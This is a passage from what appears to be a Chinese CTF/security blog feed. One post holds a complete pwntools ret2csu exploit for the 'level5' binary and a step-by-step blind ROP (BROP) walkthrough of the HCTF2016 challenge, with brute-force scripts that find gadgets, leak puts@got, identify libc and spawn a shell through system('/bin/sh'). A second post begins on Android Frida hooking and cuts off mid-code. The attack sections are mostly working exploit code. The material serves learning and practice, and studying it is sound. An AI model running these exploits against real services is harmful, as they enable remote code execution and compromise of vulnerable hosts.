<p>​        当然，最后一次ret2csu，用system函数也是可以的。不过我貌似没成功。而且理论上直接调用execve地址就完了，没必要写在bss上，但是实际操作上却行不懂。暂时存疑。</p>
<p><strong>Exploit</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./level5&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level5&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)	<span class="comment">#&quot;ldd level5&quot; to figuer out the libc version</span></span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss_addr = <span class="number">0x601038</span></span><br><span class="line">main_addr = <span class="number">0x400558</span></span><br><span class="line">write_offset = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">execve_offset = libc.symbols[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> execve_offset</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15,ret</span>):</span></span><br><span class="line">	payload = <span class="number">136</span>*<span class="string">&#x27;A&#x27;</span></span><br><span class="line">	payload +=  p64(<span class="number">0x4005e6</span>)<span class="comment"># gadget1	modify r13,r14,r15</span></span><br><span class="line">	payload += p64(<span class="number">0</span>)				<span class="comment"># padding</span></span><br><span class="line">	payload += p64(rbx)			<span class="comment"># rbx</span></span><br><span class="line">	payload += p64(rbp)			<span class="comment"># rbp			</span></span><br><span class="line">	payload += p64(r12)			<span class="comment"># call addr</span></span><br><span class="line">	payload += p64(r13)			<span class="comment"># rdi	</span></span><br><span class="line">	payload += p64(r14)			<span class="comment"># rsi</span></span><br><span class="line">	payload += p64(r15)			<span class="comment"># rdx	</span></span><br><span class="line">	payload += p64(<span class="number">0x4005d0</span>)	<span class="comment"># gadget2	modify rdi,rsi,rdx</span></span><br><span class="line">	payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span>			<span class="comment"># padding again for register</span></span><br><span class="line">	payload += p64(ret)			<span class="comment"># ret</span></span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World&quot;</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,main_addr)</span><br><span class="line">temp = p.recv(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#write_addr = u64(temp.ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">write_addr = <span class="number">0x7ffff7af4140</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;here is write_addr:&quot;</span> +<span class="built_in">hex</span>(write_addr)</span><br><span class="line">libc_addr = write_addr - write_offset</span><br><span class="line">execve_addr = libc_addr + execve_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Now we know the execve_addr:&quot;</span>,</span><br><span class="line"><span class="built_in">print</span> execve_addr</span><br><span class="line">bin_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World&quot;</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,read_got,<span class="number">0</span>,bss_addr,<span class="number">16</span>,main_addr)</span><br><span class="line">p.send(p64(execve_addr) + <span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)	#To see if you write the data successfully</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World&quot;</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,bss_addr,bss_addr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,execve_addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="C-小技巧"><a href="#C-小技巧" class="headerlink" title="C . 小技巧"></a>C . 小技巧</h3><p>​        我们直接看__libc_csu_init()发现0x4005ea到0x4005f3并不是每个字节各表示一条汇编语句，有几句占了两个字节。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819204254.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819204254.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/>

<p>​        然而直接看0x4005ed的话，我们会发现此处的汇编语句是pop rsp;</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819204817.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819204817.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/>

<p>​        0x4005efc处是pop rbp;</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819205030.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819205030.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/>

<p>​        还有pop rsi和pop rdi。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819205209.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819205209.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/>

<p>​        通过偏移我们可以找到不少gedget。</p>
<h2 id="0x01-BROP"><a href="#0x01-BROP" class="headerlink" title="0x01 . BROP"></a>0x01 . BROP</h2><h3 id="A-原理-1"><a href="#A-原理-1" class="headerlink" title="A . 原理"></a>A . 原理</h3><p>​        这个技术挺🐂🍺的。是几个斯坦福大学的师傅在公元2014年发表的<a href="http://www.scs.stanford.edu/brop/bittau-brop.pdf">论文</a>中提出的一项ROP技术，也有通俗的<a href="http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf">ppt</a>。</p>
<p>​        BROP就是blink rop，是指没有源程序源代码的情况下(一般是只允许远程连接)进行rop并且getshell。方法就是通过有限数据对程序结构进行合理猜测以及进行适当的爆破。</p>
<p>​        适用条件如下：</p>
<ul>
<li>存在栈溢出</li>
<li>进程崩溃后自行重新启动，并且重启后各地址与之前进程地址一致。</li>
</ul>
<p>​        攻击步骤如下：</p>
<ul>
<li>确定溢出长度。</li>
<li>寻找可行返回地址。</li>
<li>寻找gadget。</li>
<li>确定plt表。</li>
<li>确定got表。</li>
<li>泄露部分程序二进制数据。</li>
<li>确定libc并进行攻击。</li>
</ul>
<p>​        以下结合 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop">HCTF2016 的出题人失踪了</a>一题逐步解释，通过本地docker进行远程攻击。</p>
<h4 id="1-确定溢出长度"><a href="#1-确定溢出长度" class="headerlink" title="1 . 确定溢出长度"></a>1 . 确定溢出长度</h4><p>​        我们需要确定溢出点到返回地址的距离，通过爆破可以实现。在i逐渐递增时，如果某一个i的值使得程序发生EOF错误，就说明溢出长度超过了返回地址，那么i-1则可以视作溢出长度。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_length</span>():</span></span><br><span class="line">	i = <span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">			p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">			p.send(<span class="string">&#x27;a&#x27;</span> * i)</span><br><span class="line">			output = p.recv()</span><br><span class="line">			<span class="built_in">print</span> output</span><br><span class="line">			p.close()</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">&quot;No password&quot;</span>):</span><br><span class="line">				<span class="keyword">return</span>  i-<span class="number">1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				i+=<span class="number">1</span></span><br><span class="line">		<span class="keyword">except</span> EOFError:</span><br><span class="line">			p.close()</span><br><span class="line">			<span class="keyword">return</span>  i-<span class="number">1</span></span><br><span class="line">length = <span class="number">72</span></span><br></pre></td></tr></table></figure>

<h4 id="2-寻找可行返回地址"><a href="#2-寻找可行返回地址" class="headerlink" title="2.寻找可行返回地址"></a>2.寻找可行返回地址</h4><p>​        这里说的返回地址，是填充在rop链末端以便控制返回用的。大概是类似main()函数之类的位置，用来控制流程。</p>
<p>​        要寻找可行返回地址(stop_addr)很简单，在知道溢出长度的情况下，只要从0x400000开始爆破，如果找到某一个addr能成功让程序返回main()函数，就说明这个地址可行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fine_stop</span>():</span></span><br><span class="line">	addr = <span class="number">0x400556</span></span><br><span class="line">	<span class="keyword">while</span> addr&lt;<span class="number">0xffffff</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">			p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">			p.send(<span class="string">&#x27;a&#x27;</span> * length + p64(addr))</span><br><span class="line">			p.recv()</span><br><span class="line">			p.close()</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;===================&quot;</span></span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;This addr might work : %x&quot;</span>%addr</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;===================&quot;</span></span><br><span class="line">			addr+=<span class="number">1</span></span><br><span class="line">		<span class="keyword">except</span> Exception:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;%x--Nah&quot;</span>%addr</span><br><span class="line">			addr+=<span class="number">1</span></span><br><span class="line">			p.close()</span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br></pre></td></tr></table></figure>

<p>​        这样找出来的地址可能有不少，我们挑一个就行。</p>
<p>​        这里我们为了方便，直接让stop_addr = 0x4006B6，也就是main()函数的地址。</p>
<h4 id="3-寻找gadget"><a href="#3-寻找gadget" class="headerlink" title="3.寻找gadget"></a>3.寻找gadget</h4><p>​        又叫stack reading，旨在寻找可行的pop_ret语句，完成对于寄存器的修改。</p>
<p>​        我们知道，栈上的数据布局正常来说是这样的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">padding|canary|parameters&#x2F;pop_ret|saved returned address</span><br></pre></td></tr></table></figure>

<p>​        所以总的来说，能够使程序顺利执行的rop链基本上有如下2种结构：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = padding + <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = padding + canary + pop_ret + arg1 + ... ... + argn + <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure>

<p>​        如果我们要找pop_ret语句，爆破第二个payload即可。控制arg的数量为n个，就可以找出pop出n个寄存器的语句。该题中，我们找ret2csu中的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop rbx;</span><br><span class="line">pop rbp;</span><br><span class="line">pop r12;</span><br><span class="line">pop r13;</span><br><span class="line">pop r14;</span><br><span class="line">pop r15;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>

<p>​        则使用如下payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = padding + pop_ret + p64(<span class="number">0</span>) * <span class="number">6</span> + <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure>

<p>​        如果爆破得到了一个pop_ret顺利使得程序返回到了main()就说明它有可能是我们要找的地址。</p>
<p>​        我们还需要测试，如果不按套路给予寄存器足够的值，程序会不会崩溃：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = padding + pop_ret + p64(<span class="number">0</span>) * <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>​        如果程序崩溃，那么说明pop_ret确实是我们要找的地址，因为上述payload使其返回到了地址0x0000。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fine_csu</span>():</span></span><br><span class="line">	addr = <span class="number">0x4007a0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;%x connecting...&quot;</span>%addr</span><br><span class="line">			p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">			p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">			payload = <span class="string">&#x27;a&#x27;</span> * length		<span class="comment">#now try the rop_chain</span></span><br><span class="line">			payload+=p64(addr)		<span class="comment">#ret of vuln_func(may be)</span></span><br><span class="line">			payload+=p64(<span class="number">1</span>) + p64(<span class="number">2</span>) +p64(<span class="number">3</span>) + p64(<span class="number">4</span>) + p64(<span class="number">5</span>) +p64(<span class="number">6</span>)</span><br><span class="line">			payload+=p64(stop_gadget)		<span class="comment">#ret of pop_ret</span></span><br><span class="line">			p.send(payload)</span><br><span class="line">			output = p.recv()</span><br><span class="line">			p.close()</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">&quot;WelCome&quot;</span>):		<span class="comment">#which means we fault to return to the main() successfully</span></span><br><span class="line">				<span class="built_in">print</span> <span class="string">&quot;%x doesn&#x27;t working...&quot;</span>%addr</span><br><span class="line">				addr+=<span class="number">1</span></span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">try</span>:			<span class="comment">#Here we need to test the addr</span></span><br><span class="line">					p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">					p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">					payload = <span class="string">&#x27;a&#x27;</span> * length		</span><br><span class="line">					payload+=p64(addr)		</span><br><span class="line">					payload+=p64(<span class="number">0</span>)*<span class="number">10</span>		<span class="comment">#the given addr 0x00000000 would be unreachable for the process</span></span><br><span class="line">					p.send(payload)</span><br><span class="line">					output = p.recv()</span><br><span class="line">					p.close()</span><br><span class="line">					<span class="built_in">print</span> <span class="string">&quot;Fake addr : %x&quot;</span>%addr					<span class="comment">#The addr couldn&#x27;t be the pop_ret we need if the process exit successfully </span></span><br><span class="line">					<span class="keyword">continue</span></span><br><span class="line">				<span class="keyword">except</span> Exception:				<span class="comment">#If the program crashes,we can be sure that we got the right gadget addr</span></span><br><span class="line">					<span class="built_in">print</span> <span class="string">&quot;We found!!! The addr is : %x&quot;</span>%addr</span><br><span class="line">					<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">except</span> EOFError:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;%x caused a EOF error...&quot;</span>%addr</span><br><span class="line">			p.close()</span><br><span class="line">			addr+=<span class="number">1</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">csu_pop_ret = <span class="number">0x4007ba</span></span><br><span class="line">pop_rdi =  csu_pop_ret + <span class="number">9</span></span><br><span class="line">pop_rsi = csu_pop_ret +<span class="number">7</span></span><br></pre></td></tr></table></figure>

<h4 id="4-确定plt表"><a href="#4-确定plt表" class="headerlink" title="4 . 确定plt表"></a>4 . 确定plt表</h4><p>​        一般来说这里找的是输出函数的plt表，例如write和puts。</p>
<p>​        因为我们不知道程序中有啥数据有啥字符串，所以我们用0x400000当作输出的地址，ELF文件的开头是”\x7fELF”，只要爆破出某个地址能成功输出”\x7fELF”，我们就能确定找到了正确的输出函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_puts_plt</span>():</span></span><br><span class="line">	addr = <span class="number">0x400554</span></span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">			p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">			payload = <span class="string">&#x27;a&#x27;</span> * length		</span><br><span class="line">			payload+=p64(pop_rdi)		</span><br><span class="line">			payload+=p64(<span class="number">0x400000</span>)		<span class="comment">#This addr is &quot;\x7fELF&quot;</span></span><br><span class="line">			payload+=p64(addr)</span><br><span class="line">			payload+=p64(stop_gadget)</span><br><span class="line">			p.send(payload)</span><br><span class="line">			output = p.recv()</span><br><span class="line">			p.close()</span><br><span class="line">			<span class="keyword">if</span> output.startswith(<span class="string">&quot;\x7fELF&quot;</span>):</span><br><span class="line">				<span class="built_in">print</span> <span class="string">&quot;We got the puts_plt : %x&quot;</span>%addr</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="built_in">print</span> <span class="string">&quot;%x doesn&#x27;t make sence...&quot;</span>%addr</span><br><span class="line">				addr += <span class="number">1</span></span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">except</span> Exception:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;%x cause some error...&quot;</span>%addr</span><br><span class="line">			addr += <span class="number">1</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br></pre></td></tr></table></figure>

<h4 id="5-泄露部分程序二进制数据，确定got表"><a href="#5-泄露部分程序二进制数据，确定got表" class="headerlink" title="5 . 泄露部分程序二进制数据，确定got表"></a>5 . 泄露部分程序二进制数据，确定got表</h4><p>​        此时我们掌握了puts_plt，可以实现任意读。</p>
<p>​        但是我们的目的是找到libc。众所周知plt表项指向的是got表，got表则指向libc的真实地址。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819221436.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819221436.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>​        所以我们还需要找到puts_got。</p>
<p>​        那么为了获取更多信息，我们读一段ELF上的数据，并且通过二进制方式写入到新的文件中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_file</span>():</span></span><br><span class="line">	fi = <span class="built_in">open</span>(<span class="string">&quot;code&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">	result = <span class="string">&quot;&quot;</span></span><br><span class="line">	addr = <span class="number">0x400000</span></span><br><span class="line">	<span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">		p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;%x connecting ...&quot;</span>%addr</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">			payload = <span class="string">&#x27;a&#x27;</span> * length + p64(pop_rdi) + p64(addr)+ p64(puts_plt)+ p64(stop_gadget)</span><br><span class="line">			p.send(payload)</span><br><span class="line">			data = p.recv()</span><br><span class="line">			p.close()</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				data = data[:data.index(<span class="string">&quot;\nWelCome&quot;</span>)]</span><br><span class="line">			<span class="keyword">except</span> Exception:</span><br><span class="line">				data = data</span><br><span class="line">			<span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>:</span><br><span class="line">				data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">			result += data</span><br><span class="line">			addr += <span class="built_in">len</span>(data)</span><br><span class="line">		<span class="keyword">except</span> Exception:</span><br><span class="line">			p.close()</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">	<span class="built_in">print</span> result</span><br><span class="line">	fi.write(result)</span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br></pre></td></tr></table></figure>

<p>​        通过编辑-段-设置基址，设置0x400000为基址，然后找到0x400560(第4步中得出的plt地址)。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819220450.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819220450.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>​        c键转换成代码。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819220651.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819220651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>​        看到此处代码跳转到了0x601018，因此这个就是puts_got。</p>
<h4 id="6-确定libc并进行攻击"><a href="#6-确定libc并进行攻击" class="headerlink" title="6 . 确定libc并进行攻击"></a>6 . 确定libc并进行攻击</h4><p>​        找到了puts_got之后，再通过LibcSearcher找到对应的libc版本(可能有多个)，然后就再leak出system的地址和bin字符串的地址，即可完成攻击。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>():</span></span><br><span class="line">	p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	payload = <span class="string">&#x27;a&#x27;</span> * length + p64(pop_rdi) + p64(puts_got)+ p64(puts_plt)+ p64(stop_gadget)	<span class="comment">#We can leak the real addr of puts in the libc</span></span><br><span class="line">	p.send(payload)</span><br><span class="line">	output = p.recv()</span><br><span class="line">	output = output[:output.index(<span class="string">&quot;\nWelCome&quot;</span>)].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)	</span><br><span class="line">	puts_addr = u64(output)</span><br><span class="line">	<span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">	libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)		</span><br><span class="line">	libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">	sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">	bin_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">	payload = <span class="string">&#x27;a&#x27;</span> * length + p64(pop_rdi) + p64(bin_addr)+ p64(sys_addr)+ p64(stop_gadget)	</span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>



<p>​        </p>
]]></content>
      <tags>
        <tag>StackOverflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Hook Framework</title>
    <url>/2021/03/15/Hook%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<p>截获消息，获得控制权。<span id="more"></span></p>
<p>HOOK框架是一种Android逆向技术。在系统没有调用该函数之前，Hook就先捕获该消息，Hook函数先得到控制权，这时Hook函数既可以修改程序执行逻辑，改变参数返回值，还可以强制结束消息的传递。本文介绍常用的两种。</p>
<h1 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h1><p>Frida是基于JavaScript和python的，可以实现对android程序进行动态调试的工具包，可以用于下列用途：</p>
<ul>
<li>访问进程的内存</li>
<li>应用程序运行时覆盖功能</li>
<li>从导入的类调用函数</li>
<li>动态Hook跟踪、拦截函数</li>
<li>在堆上查找对象实例并使用这些对象实例</li>
</ul>
<p>Frida的本质是给二进制文件插桩，用安卓应用举例：在手机上运行frida_server并且转发端口到PC端，PC端又利用python代码与server进行通信，并用JavaScript对于正在执行的进程进行注入，达到内存访问的目的。如图：</p>
<img src="https://z3.ax1x.com/2021/03/25/6LUVsI.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUVsI.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" />

<p>本文对示例的两个apk分别进行java层和native层的hook调试。</p>
<h2 id="Java层"><a href="#Java层" class="headerlink" title="Java层"></a>Java层</h2><h3 id="1-手机端环境配置"><a href="#1-手机端环境配置" class="headerlink" title="1.手机端环境配置"></a>1.手机端环境配置</h3><ul>
<li>下载<a href="https://github.com/frida/frida/releases">frida_server</a>并push至手机中</li>
<li>adb shell中运行，并转发端口(默认端口为27042)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure>

<h3 id="2-Java-代码分析"><a href="#2-Java-代码分析" class="headerlink" title="2.Java 代码分析"></a>2.Java 代码分析</h3><p>demo中需要分析的代码段如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//In MainActivity:</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg6)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>(arg6.getId()) &#123;</span><br><span class="line">		<span class="comment">//Button 1</span></span><br><span class="line">	  <span class="keyword">case</span> <span class="number">2131230720</span>: &#123;</span><br><span class="line">	      Toast.makeText(<span class="keyword">this</span>.getApplication(), <span class="keyword">new</span> StringBuilder(String.valueOf(Utils.getCalc(<span class="number">2000</span>, <span class="number">5000</span>))).toString(), <span class="number">1</span>).show();</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">		<span class="comment">//Button 2</span></span><br><span class="line">	  <span class="keyword">case</span> <span class="number">2131230721</span>: &#123;</span><br><span class="line">	      Toast.makeText(<span class="keyword">this</span>.getApplication(), Utils.getMoney().getInfo(), <span class="number">1</span>).show();</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">		<span class="comment">//Button 3</span></span><br><span class="line">	  <span class="keyword">case</span> <span class="number">2131230722</span>: &#123;</span><br><span class="line">	      Toast.makeText(<span class="keyword">this</span>.getApplication(), Utils.test(<span class="number">0x7CB8</span>), <span class="number">1</span>).show();</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">		<span class="comment">//Button 4</span></span><br><span class="line">	  <span class="keyword">case</span> <span class="number">2131230723</span>: &#123;</span><br><span class="line">	      Toast.makeText(<span class="keyword">this</span>.getApplication(), Utils.test(), <span class="number">1</span>).show();</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">		<span class="comment">//Button 5</span></span><br><span 